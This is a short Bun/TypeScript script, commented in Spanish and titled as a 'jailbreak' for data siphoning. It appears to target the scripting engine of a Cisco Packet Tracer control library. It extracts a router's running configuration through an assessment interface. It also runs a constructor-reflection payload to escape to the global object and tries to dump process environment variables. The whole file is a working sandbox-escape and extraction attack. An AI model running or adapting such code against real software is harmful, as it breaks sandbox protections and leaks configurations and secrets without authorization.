#!/usr/bin/env bun
/**
 * JAILBREAK V4: DATA SIPHONING
 * Extrae datos crudos (strings) para saltar la protección de objetos nativos.
 */

import { createDefaultPTController } from "@cisco-auto/pt-control";

async function siphon() {
  const controller = createDefaultPTController();
  try {
    await controller.start();
    console.log("\n💀 INICIANDO JAILBREAK V4: DATA SIPHONING...");

    // 1. Sifonado de Configuración (AssessmentModel)
    console.log("Extraer running-config de Router0 vía AssessmentModel...");
    const config = await controller.deepInspect("AssessmentModel", "getRunningConfig", ["Router0"]);
    
    if (config.ok && config.result) {
        console.log(`✅ EXFILTRACIÓN EXITOSA. Tamaño: ${config.result.length} bytes`);
        console.log("--- CONFIG START ---");
        console.log(config.result.substring(0, 200) + "...");
        console.log("--- CONFIG END ---");
    } else {
        console.log("❌ Sifonado de config bloqueado.");
    }

    // 2. Reflexión de Función (Constructor Attack)
    console.log("\n🧪 Intentando ataque de reflexión (Constructor Attack)...");
    const reflectPayload = "(function(){}).constructor('return this')()";
    const globalObj = await controller.deepInspect("scriptEngine", "evaluate", [reflectPayload]);
    console.log(`Objeto Global detectado: ${JSON.stringify(globalObj.result)}`);

    // 3. Acceso a Variables de Entorno (si existen)
    console.log("\n🔍 Buscando fugas en el entorno...");
    const envRes = await controller.deepInspect("scriptEngine", "evaluate", ["typeof process !== 'undefined' ? process.env : 'no-process'"]);
    console.log(`Entorno: ${JSON.stringify(envRes.result)}`);

  } catch (error: any) {
    console.error(`Error: ${error.message}`);
  } finally {
    await controller.stop();
  }
}
siphon();
